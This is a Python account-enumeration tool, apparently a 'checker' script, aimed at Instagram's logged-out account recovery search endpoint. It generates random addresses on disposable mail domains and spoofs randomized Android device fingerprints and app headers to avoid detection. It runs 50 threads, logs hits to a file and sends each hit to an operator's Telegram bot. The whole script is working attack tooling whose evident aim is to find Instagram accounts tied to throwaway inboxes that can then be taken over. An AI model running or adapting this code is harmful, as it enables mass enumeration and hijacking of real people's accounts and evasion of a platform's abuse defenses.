import requests
from datetime import datetime
import time
import sys
import os
import random
import secrets
import uuid
import json
import base64
from threading import Thread
from cfonts import render

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_instagram_email(email):
    
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    
    brands = ["samsung", "Google", "Xiaomi", "OnePlus", "Nothing", "Realme", "Redmi"]
    models = ["SM-G973F", "Pixel 7", "M2102J20SG", "ONEPLUS A6003", "A063"]
    dpi_values = ["420", "450", "440"]
    res_values = ["1080x2280", "1080x2400", "1440x3088"]
    android_versions = ["11", "12", "13", "14"]
    instagram_versions = [280, 290, 300, 310, 320, 330, 340]
    
    brand = random.choice(brands)
    model = random.choice(models)
    dpi_val = random.choice(dpi_values)
    res_val = random.choice(res_values)
    android_ver = random.choice(android_versions)
    insta_ver = random.choice(instagram_versions)
    
   
    ua = f"Instagram {insta_ver}.0.0.{random.randint(10,99)} Android ({android_ver}; {dpi_val}dpi; {res_val}; {brand}; {model}; en_US)"
    
   
    tz_offset = str(random.choice([60, 330, 480, 570]))
    
    
    payload = {
        'params': json.dumps({
            "client_input_params": {
                "aac": json.dumps({
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                    "READ_CALL_LOG": "DENIED",
                    "ANSWER_PHONE_CALLS": "DENIED"
                },
                "was_headers_prefill_available": 0,
                "network_bssid": None,
                "sfdid": "",
                "fetched_email_token_list": {},
                "search_query": email,
                "auth_secure_device_id": "",
                "ig_oauth_token": [],
                "cloud_trust_token": None,
                "was_headers_prefill_used": 0,
                "sso_accounts_auth_data": [],
                "encrypted_msisdn": "",
                "device_network_info": None,
                "text_input_id": f"akyuf0:{random.randint(50, 70)}",
                "zero_balance_state": None,
                "android_build_type": "release",
                "accounts_list": [],
                "is_oauth_without_permission": 0,
                "ig_android_qe_device_id": device,
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "search_screen_type": "email_or_username",
                "is_whatsapp_installed": 1,
                "lois_settings": {"lois_token": ""},
                "ig_vetted_device_nonce": None,
                "headers_infra_flow_id": "",
                "fetched_email_list": []
            },
            "server_params": {
                "event_request_id": str(uuid.uuid4()),
                "is_from_logged_out": 0,
                "layered_homepage_experiment_group": None,
                "device_id": android,
                "login_surface": "login_home",
                "waterfall_id": str(uuid.uuid4()),
                "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
                "is_platform_login": 0,
                "context_data": "",
                "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "family_device_id": family,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "access_flow_version": "pre_mt_behavior",
                "is_from_logged_in_switcher": 0,
                "qe_device_id": device
            }
        }),
        'bk_client_context': json.dumps({
            "bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            "styles_id": "instagram"
        }),
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    
   
    headers = {
        'User-Agent': ua,
        'accept-language': 'en-IN, en-US',
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android,
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_IN',
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': tz_offset,
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        
        if email.lower() in response.text.lower():
            return True
        return False
    except Exception as e:
        
        return False

print("\033[1;94m--- Starting Script, Please Wait... ---\033[0m\n")
time.sleep(1)
clear()

red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
white = "\033[1m\033[37m"
reset = '\033[0m'

logo = render('BUNNY', font='block', colors=['cyan', 'white'], align='left', space=True)
print("\x1b[1;39m—" * 60)
print(logo)
print("\x1b[1;39m—" * 60)
print('')
        
hit = 0
baddie_ig = 0
ayodhya = 0

print("𝐄𝐍𝐓𝐄𝐑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐀𝐍")
token = input(f"➜ ").strip()
clear()
print("\x1b[1;39m—" * 60)
print(logo)
print("\x1b[1;39m—" * 60)
print('')
print('𝐄𝐍𝐓𝐄𝐑 𝐂𝐇𝐀𝐓 𝐈𝐃')
chat_id = input(f"➜ ").strip()
clear()

def icdcm(mail):
    global hit
    msg = f"""
    =============================          
GOT A HIT  #𝐏𝐲𝐁𝐮𝐧𝐧𝐲     
=============================   
    𝐓𝐎𝐓𝐀𝐋 𝐇𝐈𝐓𝐒 : {hit}
    𝐄𝐌𝐀𝐈𝐋 : {mail}
=============================   
𝐇𝐈𝐓 𝐁𝐘 : @sneuo
=============================   
"""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'}
    try:
        requests.post(url, data=payload)
    except:
        pass
    
def status():
    global hit, baddie_ig, ayodhya
    pyanuj = f"""
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
𝐇𝐈𝐓   ➜ {green}{hit}{reset}
𝐁𝐀𝐃 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌   ➜ {red}{baddie_ig}{reset}
𝐓𝐎𝐓𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐄𝐃   ➜ {yellow}{ayodhya}{reset}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐃𝐄𝐕 — @sneuo {reset}
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▱
"""
    clear()
    print(pyanuj)

def genprefix():
    char = 'abcdefghijklmnopqrstuvwxyz'
    lent = random.randint(6,7)
    name = ''.join(random.choices(char, k=lent))
    return name

def adh(choose):  
    global hit, baddie_ig, ayodhya

    while True:
        prefix = genprefix()
        
        if choose == '1':
            domain = '@hi2.in'
        elif choose == '2':
            domain = '@telegmail.com'
        else:
            domain = '@hi2.in'
        
        email = f'{prefix}{domain}'
        ayodhya += 1
        status()
        
        
        if check_instagram_email(email):
            hit += 1
            status()
            print(f'{green}✓ Hit found: {email} {reset}')
            with open('Tempmail.txt', 'a') as f:
                f.write(email + '\n')
            icdcm(email)
        else:
            baddie_ig += 1
            status()
            print(f'{red}✗ Not on Instagram: {email} {reset}')

if __name__ == '__main__':
    print(f"""
————————————————————   
{green}[1]{white} 𝐇𝐈2 
{green}[2]{white} 𝐓𝐄𝐋𝐄𝐆𝐌𝐀𝐈𝐋 
————————————————————
""")

    choose = input(f"{cyan}➤ your choice (1/2): {reset}").strip()

    for i in range(50):
        Thread(target=adh, args=(choose,)).start()
